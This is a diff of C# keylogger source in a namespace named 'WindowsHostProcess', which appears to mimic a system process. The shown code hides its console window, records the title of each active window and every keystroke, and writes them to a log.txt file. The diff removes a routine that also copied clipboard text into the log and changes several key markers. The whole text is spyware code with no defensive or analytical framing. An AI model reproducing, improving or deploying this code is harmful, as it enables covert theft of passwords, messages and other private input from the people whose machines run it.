@@ -16,9 +16,7 @@ namespace WindowsHostProcess
         public static string preWin = "";
         public static string newWin = "";
         public static int fstWin = 0;
-        public static string OldClipText = string.Empty;
 
-        [STAThread]
         public static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
@@ -40,16 +38,6 @@ namespace WindowsHostProcess
             if (GetWindowText(handle, Buff, nChars) > 0)
             {
                 return Buff.ToString();
-            }
-            return null;
-        }
-
-        private static string GetClipboardData()
-        {
-            if (Clipboard.ContainsText(TextDataFormat.Text))
-            {
-                string clipboardText = "   [CLIPBOARD]    " + Clipboard.GetText(TextDataFormat.Text) + "   [CLIPBOARD]   " + Environment.NewLine;
-                return clipboardText.ToString();
             }
             return null;
         }
@@ -78,7 +66,6 @@ namespace WindowsHostProcess
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
 
                 newWin = GetActiveWindowTitle();
-
                 if(newWin != preWin)
                 {
                     if (fstWin == 1)
@@ -87,17 +74,12 @@ namespace WindowsHostProcess
                         sw.Write(Environment.NewLine + Environment.NewLine);
                         sw.Write("*** " + newWin + " ***");
                         sw.Write(Environment.NewLine);
-                        string clipboard = GetClipboardData();
-                        sw.Write(clipboard);
                     }
                     else
                     {
-                        preWin = newWin;
                         sw.Write("*** " + newWin + " ***");
                         sw.Write(Environment.NewLine);
                         fstWin = 1;
-                        string clipboard = GetClipboardData();
-                        sw.Write(clipboard);
                     }
                 }
 
@@ -165,11 +147,11 @@ namespace WindowsHostProcess
                         break;
 
                     case Keys.CapsLock:
-                        sw.Write("{*~CAPS~*}");
+                        sw.Write("{****CAPSLOCK****}");
                         break;
 
                     case Keys.Delete:
-                        sw.Write("[DEL}");
+                        sw.Write("⌦");
                         break;
 
                     case Keys.Insert:
@@ -310,7 +292,7 @@ namespace WindowsHostProcess
                         break;
 
                     case Keys.Back:
-                        sw.Write("{BACK}");
+                        sw.Write("⌫");
                         break;
 
                     default:
